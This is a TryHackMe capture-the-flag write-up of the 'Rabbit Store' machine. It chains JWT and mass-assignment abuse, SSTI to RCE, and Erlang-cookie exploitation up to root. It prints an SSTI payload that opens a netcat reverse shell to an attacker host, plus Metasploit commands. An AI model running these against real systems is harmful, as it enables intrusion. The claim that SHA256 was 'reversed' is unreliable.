# Rabbit Store — TryHackMe Writeup

### Lab Info
```
Platform: TryHackMe  
Room: Rabbit Store  
Difficulty: Medium  
Target OS: Linux  
Services: Apache, RabbitMQ, Erlang  
```
---

## Overview

This machine involved:

- JWT manipulation
- Mass assignment vulnerability
- Server-Side Template Injection (SSTI)
- Remote Code Execution (RCE)
- RabbitMQ exploitation via Erlang cookie
- Password hash extraction and decoding
---
## Tools Used

- Nmap
- Burp Suite
- Netcat
- Metasploit
- CyberChef
- JWT.io
---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV <IP>
Open Ports
Port	Service
22	SSH (OpenSSH 8.9p1)
80	Apache 2.4.52
4369	Erlang Port Mapper (epmd)
25672	RabbitMQ Clustering
```
Website redirected to: `http://cloudsite.thm`

Login page: `http://storage.cloudsite.thm`

### Web Enumeration

Registered user:
```
admin@local.thm : admin
```
Access was restricted to internal users.

### JWT Analysis

Extracted JWT from browser storage.

Decoded using jwt.io and found:
```
"subscription": "inactive"
```
This suggested potential privilege manipulation.

### Mass Assignment Vulnerability

Registered new user:
```
user@local.thm : user123
```
Intercepted request in Burp and added:
`"subscription": "active"`

User successfully registered as active.
Gained access to file upload functionality.

### File Upload Analysis

Direct upload stripped extensions (no RCE).
However, another feature allowed to upload from URL

Downloading a file from:`/api/uploads/<uuid>`

This revealed API documentation where I found hidden route:`/api/fetch_messages_from_chatbot`

---

## Server-Side Template Injection (SSTI)

GET request not allowed so I sent POST request as `Content-Type: application/json`

I got error saying: `username is required`

#### Tested SSTI:
```
{"username":"{{7*7}}"}
```
Response: `49`

This confirmed that there is SSTI vulnerability.

---
## Remote Code Execution

Used payload:
```
{
"username":"{{request.application.__globals__.__builtins__.eval('__import__(\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 1337 >/tmp/f\").read()')}}"
}
```
Started listener:
```
nc -lvnp 1337
```
#### Got reverse shell.

#### Shell Stabilization
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo; fg
stty rows 38 columns 116
```
#### User Flag

Location:`/home/azrael/user.txt`

## RabbitMQ Enumeration

RabbitMQ data directory: `/var/lib/rabbitmq/`

Found: `.erlang.cookie`

Cookie value: `r8jQC970pWBgtkSD`

---
## Erlang Cookie Exploitation

#### Used Metasploit module:
```
exploit/multi/misc/erlang_cookie_rce

set RHOSTS <target_ip>
set RPORT 25672
set COOKIE r8jQC970pWBgtkSD
set LHOST <attacker_ip>
run
```
#### Gained shell as:
```
rabbitmq@forge
```
## RabbitMQ Enumeration

Exported definitions:
```
rabbitmqctl export_definitions --node rabbit@forge thm.json
```
#### Found root user password hash:
```
"password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
```
### Understanding RabbitMQ Hashing

RabbitMQ uses: `rabbit_password_hashing_sha256`

Structure: `Base64(SALT + SHA256(SALT + password))`

The first 8 bytes represent the salt.

### Recovering Root Password

Steps:

- Decode Base64
- Remove first 8 bytes (salt)
- Reverse SHA256 logic
- Used CyberChef to analyze structure.
- Recovered root credentials.

## Root Flag

After logging in as root:
```
ls -la
cat root.txt
FLAG{...}
```
---
## Attack Chain Summary

- Enumerated web app
- Modified JWT subscription flag
- Exploited mass assignment
- Discovered hidden API endpoint
- Exploited SSTI → RCE
- Extracted Erlang cookie
- Used Metasploit Erlang RCE
- Dumped RabbitMQ definitions
- Recovered root password
- Retrieved root flag
---
## Key Takeaways

JWT manipulation often reveals privilege escalation paths.
Mass assignment vulnerabilities are extremely dangerous.
SSTI can quickly escalate to RCE.
Always inspect /var/lib/rabbitmq/.
Erlang cookies allow full cluster access.
RabbitMQ password hashing includes salt prefix.




